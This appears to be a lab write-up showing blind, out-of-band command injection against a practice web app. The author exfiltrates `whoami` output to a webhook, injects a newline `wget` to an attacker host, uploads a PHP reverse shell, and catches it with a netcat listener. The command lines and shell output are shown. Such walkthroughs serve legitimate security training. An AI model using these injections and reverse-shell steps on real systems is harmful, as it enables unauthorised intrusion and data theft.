# Command Injection - Blind | Out of Bond

- In the provided tab where I can enter the URL, I will now proceed to further investigate and explore.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/e8ba5d60-4dd4-4685-be8c-9e929e624408)

- Upon entering the website URL, the response received is "website ok."

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/5b166f42-ab4f-4b96-8266-5d7b176d38d6)

- After attempting a simple payload, the response received remains the same, indicating "website ok" without any discernible changes.
- When trying to navigate to a random page in the URL, the response received is "website not found."

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/ad7b494e-019e-4ce0-8db3-2837d813bf2d)
![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/7aa181f0-64ca-47e0-a4eb-01343305537c)

- When attempting to execute a simple injection command and encountering a potential command filtering mechanism, it further reinforces the indication of a blind command injection vulnerability.
- By utilizing the webhook.site URL and injecting a command, I received a response from the URL containing the username. This confirms the existence of an `Out-of-band` command injection vulnerability.
- cmd: "<IP>?`whoami`"

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/f2afd58e-fb62-4261-8b81-8537f70dec24)
![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/6df42ea6-f0f8-46b1-80b6-6713be6cc2f5)

- I attempted to make a new request using the newline character. The purpose of this request was to retrieve a file from my Linux machine.
- I set up a Python server on my machine and injected the command into the URL.
- cmd: `https://<RHOST> /n wget http://<LHOST>:8080/test`

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/1f237314-654c-4227-b192-6ef5822161e8)

- I observe that the request has been made successfully, indicating that the command injection was successful.

```bash
└─$ python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
xxx.xxx.xx.4 - - [16/Jul/2023 04:50:29] code 404, message File not found
xxx.xxx.xx.4 - - [16/Jul/2023 04:50:29] "HEAD /test HTTP/1.1" 404 -
```
- As I see that the URL has been sanitizing signs like semicolons (;) and colons (:) so to bypass it I'll upload a PHP rev shell and then execute in order to take the rev shell back.

```bash
└─$ python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
xxx.xxx.xx.4 - - [16/Jul/2023 05:00:04] "HEAD /phprevshell.php HTTP/1.1" 200 -
```
- On navigation from the browser to `IP/phprevshell.php` I got the revshell back to my system.

![image](https://github.com/singhx-hub/WebVulnLab/assets/126919241/6177876c-20b1-4ba2-89f7-eb85f14add61)


```bash
└─$ rlwrap nc -nvlp 1234 
listening on [any] 1234 ...
connect to [xxx.xxx.xxx.x86] from (UNKNOWN) [xxx.xxx.xx0.4] 52072
Linux d19181ed4936 6.3.0-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.3.7-1kali1 (2023-06-29) x86_64 GNU/Linux
 04:01:55 up  5:09,  0 users,  load average: 1.83, 1.65, 1.65
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

